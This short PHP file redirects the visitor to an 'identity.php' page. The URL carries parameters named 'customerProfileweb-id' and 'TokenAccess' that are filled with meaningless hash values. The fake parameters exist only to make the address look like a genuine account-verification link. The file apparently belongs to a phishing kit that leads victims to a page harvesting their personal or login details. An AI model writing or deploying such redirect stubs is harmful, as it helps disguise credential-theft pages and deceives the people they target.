<?php
header("Location: ../../identity.php?customerProfileweb-id=".sha1(md5(gmdate('bou blel')))."_&TokenAccess=".strtoupper(sha1(256))." ");
?>